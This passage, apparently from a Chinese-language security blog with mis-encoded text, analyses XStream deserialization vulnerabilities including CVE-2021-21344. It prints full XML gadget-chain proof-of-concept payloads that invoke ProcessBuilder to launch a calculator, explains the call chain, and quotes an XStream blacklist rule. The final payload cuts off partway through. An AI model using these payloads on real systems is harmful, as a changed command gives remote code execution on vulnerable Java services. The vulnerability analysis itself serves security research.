class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;&#x2F;flags&gt;</span><br><span class="line">      &lt;value class&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class&#x3D;&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class&#x3D;&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class&#x3D;&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;&#x2F;initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;&#x2F;opmode&gt;</span><br><span class="line">                &lt;serviceIterator class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class&#x3D;&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class&#x3D;&quot;java.util.Collections$EmptyIterator&quot;&#x2F;&gt;</span><br><span class="line">                    &lt;next class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command class&#x3D;&quot;java.util.Arrays$ArrayList&quot;&gt;</span><br><span class="line">                        &lt;a class&#x3D;&quot;string-array&quot;&gt;</span><br><span class="line">                          &lt;string&gt;open&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;-a&lt;&#x2F;string&gt;</span><br><span class="line">                          &lt;string&gt;calculator.app&lt;&#x2F;string&gt;</span><br><span class="line">                        &lt;&#x2F;a&gt;</span><br><span class="line">                      &lt;&#x2F;command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;&#x2F;redirectErrorStream&gt;</span><br><span class="line">                    &lt;&#x2F;next&gt;</span><br><span class="line">                  &lt;&#x2F;iter&gt;</span><br><span class="line">                  &lt;filter class&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;&#x2F;class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;&#x2F;name&gt;</span><br><span class="line">                      &lt;parameter-types&#x2F;&gt;</span><br><span class="line">                    &lt;&#x2F;method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;&#x2F;name&gt;</span><br><span class="line">                  &lt;&#x2F;filter&gt;</span><br><span class="line">                  &lt;next class&#x3D;&quot;string&quot;&gt;foo&lt;&#x2F;next&gt;</span><br><span class="line">                &lt;&#x2F;serviceIterator&gt;</span><br><span class="line">                &lt;lock&#x2F;&gt;</span><br><span class="line">              &lt;&#x2F;cipher&gt;</span><br><span class="line">              &lt;input class&#x3D;&quot;java.lang.ProcessBuilder$NullInputStream&quot;&#x2F;&gt;</span><br><span class="line">              &lt;ibuffer&gt;&lt;&#x2F;ibuffer&gt;</span><br><span class="line">              &lt;done&gt;false&lt;&#x2F;done&gt;</span><br><span class="line">              &lt;ostart&gt;0&lt;&#x2F;ostart&gt;</span><br><span class="line">              &lt;ofinish&gt;0&lt;&#x2F;ofinish&gt;</span><br><span class="line">              &lt;closed&gt;false&lt;&#x2F;closed&gt;</span><br><span class="line">            &lt;&#x2F;is&gt;</span><br><span class="line">            &lt;consumed&gt;false&lt;&#x2F;consumed&gt;</span><br><span class="line">          &lt;&#x2F;dataSource&gt;</span><br><span class="line">          &lt;transferFlavors&#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;dataHandler&gt;</span><br><span class="line">        &lt;dataLen&gt;0&lt;&#x2F;dataLen&gt;</span><br><span class="line">      &lt;&#x2F;value&gt;</span><br><span class="line">    &lt;&#x2F;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference&#x3D;&quot;..&#x2F;..&#x2F;entry&#x2F;jdk.nashorn.internal.objects.NativeString&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><p>ç®€å•è§£é‡Šä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 1. XStream å¤„ç†Mapç±»å‹ å»è°ƒç”¨</span><br><span class="line">jdk.nashorn.internal.objects.NativeString#hashCode</span><br><span class="line"># 2. hashCodeæ‰§è¡Œäº†this.value.toString()ï¼Œå°†å…¶ä¸­valueè®¾ç½®ä¸ºBase64Data</span><br><span class="line">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString</span><br><span class="line"># 3. Base64Data.toStringæ‰§è¡Œäº†this.dataHandler.getDataSource().getInputStream()ï¼ŒæŒ‡å®šå…¶ä¸­å±æ€§dataHandlerä¸ºjavax.activation.DataHandler</span><br><span class="line">javax.activation.DataHandler#getDataSource</span><br><span class="line"># 4. DataHandler.getDataSource()è¿”å›å±æ€§ç±»å‹ä¸ºDataSourceï¼Œè¯¥å±æ€§ ç½®ä¸ºXmlDataSource</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream</span><br><span class="line"># 5. XmlDataSource æœ‰ä¸ªInputStreamçš„å±æ€§ï¼Œä¸ºgetInputStreamè¿”å›å€¼ï¼Œè®¾ç½®ä¸ºCipherInputStreamã€‚</span><br><span class="line"># å›åˆ°æ­¥éª¤3ï¼Œæ‰§è¡Œå®ŒgetInputStreamä¹‹åï¼Œæ‰§è¡Œäº†readFrom(is)ï¼Œå®é™…è°ƒç”¨is.read</span><br><span class="line">javax.crypto.CipherInputStream#read -&gt; getMoreData</span><br><span class="line"># 6. CipherInputStream.readè°ƒç”¨this.cipher.update()ï¼Œå…¶ä¸­æŒ‡å®šcipherä¸ºNullCipher</span><br><span class="line">javax.crypto.NullCipher#update -&gt; chooseFirstProvider</span><br><span class="line"># 7. NullCipher.updateæ‰§è¡Œäº†çˆ¶ç±»çš„æ–¹æ³•Cipher.chooseFirstProviderï¼Œç»§ç»­æ‰§è¡Œäº†this.serviceIterator.hasNext(),å…¶ä¸­serviceIterator ç½®ä¸ºFilterIterator</span><br><span class="line">javax.imageio.spi.FilterIterator#next</span><br><span class="line"># 8. FilterIterator.nextæ‰§è¡Œäº†filter.filter()ï¼Œå…¶ä¸­filterä¸ºå±æ€§ï¼Œç½®è¯¥å±æ€§ä¸ºContainsFilterå®ä¾‹</span><br><span class="line">javax.imageio.ImageIO.ContainsFilter#filter</span><br><span class="line"># 9. ContainsFilter.filteræ‰§è¡Œäº†method.invoke(elt)ï¼Œå…¶ä¸­methodä¸ºç±»å±æ€§å¯æ§ï¼Œeltä¸ºå‚æ•°ï¼Œä¸ºiterçš„next()å€¼</span><br><span class="line">ProcessBuilder#start</span><br></pre></td></tr></table></figure><h3 id="å®˜ç½‘çš„POC"><a href="#å®˜ç½‘çš„POC" class="headerlink" title="å®˜ç½‘çš„POC"></a>å®˜ç½‘çš„POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªPOCå¤§åŒå°å¼‚ï¼Œæœ€ä¸åŒç‚¹åœ¨FilterIteratorçš„æ„é€ ï¼Œæ¶‰åŠåˆ°filter.filter(elt) ä¸­çš„eltæ˜¯å¦‚ä½•å®ç°å¯æ§çš„</p><h3 id="æ§åˆ¶elt"><a href="#æ§åˆ¶elt" class="headerlink" title="æ§åˆ¶elt"></a>æ§åˆ¶elt</h3><p>è¿™é‡Œæ˜¯FilterIteratorç±»çš„ä»£ç ï¼Œç›®æ ‡æ˜¯æ§åˆ¶filter.filter(elt)ä¸­çš„eltï¼Œæ³¨æ„æ¯”è¾ƒä¸¤ä¸ªPOCåœ¨FilterIteratorè¿™é‡Œçš„åŒºåˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#javax.imageio.spi.FilterIterator</span><br><span class="line">    <span class="keyword">private</span> Iterator&lt;T&gt; iter;</span><br><span class="line">    <span class="keyword">private</span> ServiceRegistry.Filter filter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T next = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">advance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            T elt = iter.next();</span><br><span class="line">            <span class="keyword">if</span> (filter.filter(elt)) &#123;</span><br><span class="line">                next = elt;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> next != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        &#125;</span><br><span class="line">        T o = next;</span><br><span class="line">        advance();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li><p>å®˜ç½‘çš„java.util.ArrayList$Itrå®ç°<br>ç”¨çš„æ˜¯java.util.ArrayList$Itr<br>å…¶ä¸­éœ€è¦æ³¨æ„ArrayList.thisï¼Œå½“ArrayList add/growï¼Œéƒ½ä¼šæ›´æ–°ArrayList.elementDataï¼Œæ‰€ä»¥iter.next()æˆåŠŸå–åˆ°ProcessBuilderå®ä¾‹ã€‚<br><img src="/images/pasted-138.png" alt="upload successful"></p></li><li><p>Wh1t3p1gå¸ˆå‚…çš„java.util.Collections$EmptyIteratorå®ç°<br>ç”¨çš„æ˜¯java.util.Collections$EmptyIteratorï¼Œè¿™é‡Œæ³¨æ„åµŒå¥—äº†ä¸¤å±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator it = makeFilterIterator(</span><br><span class="line">                makeFilterIterator(Collections.emptyIterator(), obj, <span class="keyword">null</span>),</span><br><span class="line">                <span class="string">&quot;foo&quot;</span>,</span><br><span class="line">                filter</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><p> è¿™é‡Œçš„æ§åˆ¶eltçš„æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>step1:åˆ©ç”¨çš„æ˜¯EmptyIterator hasNext() ä¸ºfalseï¼Œæ„é€ äº†ç¬¬ä¸€å±‚FilterIterator iter1ï¼Œä½¿å¾—iter1.next() = iter1.next</li><li>step2:å†æ„é€ ä¸€å±‚ FilterIterator iter2ï¼Œiter2.iter=iter1,ä½¿å¾—iter2.next() = iter2.iter1.next() = iter2.iter1.next</li></ul></li></ol><p><img src="/images/pasted-139.png" alt="upload successful"></p><h3 id="é»‘åå•ï¼š"><a href="#é»‘åå•ï¼š" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.imageio.ImageIO$ContainsFilter</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><p>author: é’Ÿå¸ˆå‚…</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span 